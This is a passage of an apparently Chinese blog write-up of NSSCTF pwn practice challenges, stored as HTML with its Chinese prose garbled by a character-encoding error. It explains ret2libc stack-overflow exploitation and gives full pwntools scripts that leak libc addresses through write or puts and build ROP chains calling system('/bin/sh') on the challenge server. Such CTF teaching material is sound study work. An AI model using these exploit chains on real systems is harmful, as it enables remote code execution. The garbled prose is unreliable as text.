</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ret2libc">ret2libc
</h2><p><a class="link" href="P9.zip" >P9.zip</a></p>
<p>checksecï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/31.png"
	width="851"
	height="239"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/31_hu_b233f98545165641.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/31_hu_7a392440e880faa8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="356"
		data-flex-basis="854px"
	
></p>
<p>64ä½ï¼Œå¼€NXä¿æŠ¤ï¼Œå…³canaryã€PIEä¿æŠ¤ã€‚</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/32.png"
	width="755"
	height="206"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/32_hu_8aa99fb80dcb8a6f.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/32_hu_dfe7630ee31e88b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="366"
		data-flex-basis="879px"
	
></p>
<p>æ ˆæº¢å‡ºéœ€è¦å¡«å……0x40+8ï¼Œä¸”ç¨‹åºç›®å‰åªæœ‰writeå‡½æ•°å¯ä»¥æ³„éœ²ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// attributes: thunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">ssize_t</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/34.png"
	width="1045"
	height="220"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/34_hu_8f40d72167a6d16d.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/34_hu_d5ceaab1af37f7d8.png 1024w"
	loading="lazy"
	
		alt="write_plt:0x0000000000404018"
	
	
		class="gallery-image" 
		data-flex-grow="475"
		data-flex-basis="1140px"
	
></p>
<p>æ‰¾åˆ°äº†write_pltçš„åœ°å€äº†ã€‚</p>
<p>æ¥ä¸‹æ¥ç¼–å†™expæ—¶ï¼Œgadgetçš„åœ°å€è‡ªè¡ŒæŸ¥è¯¢äº†ã€‚</p>
<p>é‚£ä¹ˆåœ¨æ³„éœ²writeå‡½æ•°æ—¶ï¼Œæœ‰ä¸‰ä¸ªå˜é‡ï¼Œå°±åº”è¯¥éœ€è¦<code>pop_rdi_rsi_rdx_ret</code>è¿™ä¸€ä¸ªgadgetï¼Œä½†çœŸçš„æœ‰è¿™ä¸€ä¸ªgadgetå—ï¼Ÿ</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/33.png"
	width="889"
	height="434"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/33_hu_9d1cc401742c380.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/33_hu_76570c1b2e364961.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="204"
		data-flex-basis="491px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ç¼ºå¤±ä¸€ä¸ªrdxå¯„å­˜å™¨çš„gadgetçš„ï¼Œè€Œè¿™ä¸ªå¯„å­˜å™¨åˆšå¥½æ§åˆ¶çš„æ˜¯writeå‡½æ•°çš„sizeå¤§å°é™åˆ¶ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„å†…å®¹åªè¦ä¸æ˜¯å¾ˆå¤§çš„è¯ï¼Œè¿˜æ˜¯å¯ä»¥å¿½ç•¥çš„ï¼Œä¸»è¦è¿˜æ˜¯å‰é¢ä¸¤ä¸ªå¯„å­˜å™¨æ§åˆ¶çš„å˜é‡æ¯”è¾ƒé‡è¦ã€‚</p>
<p>ä½†æ˜¯æœ‰rdiå¯„å­˜å™¨çš„gadgetåªæœ‰ä¸€ä¸ªï¼Œè¿˜æ˜¯å¸¦æœ‰r15çš„ï¼Œè¿™å¯æ€ä¹ˆåŠï¼Ÿ</p>
<blockquote class="alert alert-tip">
    <blockquote>
<p>åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œå¾ˆéš¾ç›´æ¥æ‰¾åˆ°å®Œç¾çš„ <code>pop rsi; ret</code> gadgetï¼ˆä»…å¼¹å‡º <code>rsi</code> å¹¶è¿”å›ï¼‰ï¼Œæ›´å¤šæ—¶å€™ä¼šé‡åˆ° <strong><code>pop rsi; pop r15; ret</code></strong> è¿™ç±» gadgetï¼ˆè¿ç»­å¼¹å‡ºä¸¤ä¸ªå¯„å­˜å™¨ï¼‰ã€‚</p>
<p>ä½¿ç”¨è¿™ä¸ª gadget æ—¶ï¼Œå¿…é¡»åœ¨æ ˆä¸Šæä¾› <strong>ä¸¤ä¸ªå€¼</strong>ï¼šç¬¬ä¸€ä¸ªç»™ <code>rsi</code>ï¼ˆæœ‰ç”¨å‚æ•°ï¼‰ï¼Œç¬¬äºŒä¸ªç»™ <code>r15</code>ï¼ˆæ— ç”¨ï¼Œä½†å¿…é¡»å¡«å……ä»¥è®© <code>ret</code> æ­£ç¡®å–åœ°å€ï¼‰ï¼Œ<code>p64(0)</code> è¢«å¼¹å‡ºåˆ° <code>r15</code>ï¼ˆä»…å ä½ï¼Œå€¼å¯ä»¥æ˜¯ä»»æ„çš„ï¼Œé€šå¸¸ç”¨ 0 æˆ–åƒåœ¾æ•°æ®ï¼‰ã€‚è¿™æ ·å­<code>pop rsi; pop r15; ret</code>â‡” <code>pop rsi; ret</code>äº†ã€‚</p>
</blockquote></blockquote>
<p>payload1ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io=process(&#34;./main&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">25379</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./main&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401283</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x0000000000401281</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ—¶å€™å·²ç»æ³„éœ²äº†writeçš„çœŸå®åœ°å€äº†ï¼Œç„¶åæˆ‘ä»¬å°±æ³„éœ²libcçš„åç§»é‡åæ¨å‡ºç¨‹åºçš„åŸºåœ°å€ï¼Œæœ€åå¾—å‡ºå…¶å®ƒå‡½æ•°åœ¨è¿™ä¸ªâ€œmainâ€ç¨‹åºçš„çœŸå®åœ°å€ã€è¿›è¡Œè°ƒç”¨ä»è€Œgetshellå¾—flagã€‚</p>
<p>å¾—å‡ºåŸºåœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;OK! Bye~&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_read_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_read_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ„é€ ROPé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;);</code>åé—¨å‡½æ•°ï¼š</p>
<p>payload2ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;OK! Bye~&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_read_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_read_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_offset</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">binsh_offset</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io=process(&#34;./main&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">25379</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./main&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401283</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x0000000000401281</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;OK! Bye~&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_read_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_read_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_offset</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">binsh_offset</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ç»¼åˆç»ƒä¹ ">ç»¼åˆç»ƒä¹ 
</h2><p><a class="link" href="P10.zip" >P10.zip</a></p>
<p>å…ˆç»™å„ä½å¤§ä½¬æŠ›å‡ºä¸ªé—®é¢˜ï¼Œæ±‚è§£å†³ï¼šä¸ºä»€ä¹ˆè°ƒç”¨ä¸äº†systemå‡½æ•°å»getshellï¼Ÿè°ƒè¯•ä¸äº†æ ˆå¯¹é½&hellip;</p>
<blockquote>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io=process(&#34;./main&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">24302</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./main&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_offset</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040122b</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;No system now. Tell me!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_read_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_read_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">binsh_offset</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;No system now. Tell me!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div></blockquote>
<p>checksecï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/35.png"
	width="680"
	height="235"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/35_hu_1dd22625de70b908.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/35_hu_f73dac1cd410e1db.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="289"
		data-flex-basis="694px"
	
